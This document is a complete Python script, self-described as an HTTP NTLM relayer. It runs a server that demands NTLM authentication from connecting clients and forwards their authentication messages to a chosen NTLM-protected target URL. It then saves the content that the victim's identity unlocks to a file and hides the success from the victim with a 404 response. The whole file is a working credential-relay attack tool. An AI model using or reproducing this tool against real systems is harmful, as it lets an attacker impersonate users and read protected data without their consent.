#!/usr/bin/env python3


import requests
import sys
from argparse import ArgumentDefaultsHelpFormatter, ArgumentParser
from http import HTTPStatus
from http.server import BaseHTTPRequestHandler, HTTPServer
from loguru import logger


EXIT_OK = 0
EXIT_ERROR = 1


class HttpNtlmRelayHandler(BaseHTTPRequestHandler):
    # These have to be class variables as for every request a new object is created.
    target_url = None
    output_file = None
    session = None


    def do_GET(self):
        logger.info(f"Received GET request from {self.client_address} to {self.path} with headers \n{self.headers}")
        self.protocol_version = "HTTP/1.1"
        try:
            if not "Authorization" in self.headers:
                logger.debug("Request without Authorization header received")
                if self.path == "/favicon.ico":
                    self.send_response(HTTPStatus.NOT_FOUND)
                    self.send_header("Content-Length", "0")
                    self.end_headers()
                else:
                    logger.debug("Telling client to use NTLM authentication")
                    self.send_response(HTTPStatus.UNAUTHORIZED)
                    self.send_header("WWW-Authenticate", "NTLM")
                    self.send_header("Connection", "close")
                    self.send_header("Content-Length", "0")
                    self.end_headers()
            elif self.headers["Authorization"].startswith("NTLM"):
                # Use authentication data (NTLM negotiate / authenticate messages) from client and send it along
                # with our request to the target
                logger.debug("Sending request to target with authentication data from client")
                if HttpNtlmRelayHandler.session is None:
                    HttpNtlmRelayHandler.session = requests.Session()
                resp = HttpNtlmRelayHandler.session.get(
                    HttpNtlmRelayHandler.target_url,
                    headers={"Authorization": self.headers["Authorization"]}
                )
                if resp.status_code == HTTPStatus.UNAUTHORIZED.value:
                    logger.debug(
                        f"Received status code {HTTPStatus.UNAUTHORIZED} from target, sending it back to client"
                    )
                    self.send_response(HTTPStatus.UNAUTHORIZED)
                    self.send_header("WWW-Authenticate", resp.headers["WWW-Authenticate"])
                    self.send_header("Connection", "keep-alive")
                    self.send_header("Content-Length", "0")
                    self.end_headers()
                elif resp.status_code == HTTPStatus.OK.value:
                    logger.debug(
                        f"Received status code {HTTPStatus.OK} from target, sending {HTTPStatus.NOT_FOUND} back to client"
                    )
                    self.send_response(HTTPStatus.NOT_FOUND)
                    self.send_header("Content-Length", "0")
                    self.end_headers()
                    HttpNtlmRelayHandler.session = None
                    with open(HttpNtlmRelayHandler.output_file, "w") as f:
                        f.write(resp.content.decode())
                else:
                    logger.error(f"Received unexpected status code {resp.status_code} from target")
                    self.send_response(HTTPStatus.INTERNAL_SERVER_ERROR)
                    self.send_header("Content-Length", "0")
                    self.end_headers()
                    HttpNtlmRelayHandler.session = None
        except Exception:
            logger.exception("Exception occurred while processing the request:")
            self.send_response(HTTPStatus.INTERNAL_SERVER_ERROR)
            self.send_header("Content-Length", "0")
            self.end_headers()
            HttpNtlmRelayHandler.session = None


    def log_request(self, code: int | str = "-", size: int | str = "-"):
        logger.info(f"Sending response with status code {str(code)}")


def main() -> int:
    parser = ArgumentParser(description="An NTLM relayer for HTTP", formatter_class=ArgumentDefaultsHelpFormatter)
    parser.add_argument("--listen-addr", default="127.0.0.1")
    parser.add_argument("--listen-port", type=int, default=8080)
    parser.add_argument("target_url", help="NTLM-protected URL to get data from")
    parser.add_argument("output_file", help="Path to the file to store the content retrieved from the target in")
    args = parser.parse_args()
    HttpNtlmRelayHandler.target_url = args.target_url
    HttpNtlmRelayHandler.output_file = args.output_file

    logger.info("Starting server...")
    try:
        server = HTTPServer((args.listen_addr, args.listen_port), HttpNtlmRelayHandler)
        server.serve_forever()
    except KeyboardInterrupt:
        logger.info("Shutting down server...")
    return EXIT_OK


if __name__ == "__main__":
    sys.exit(main())
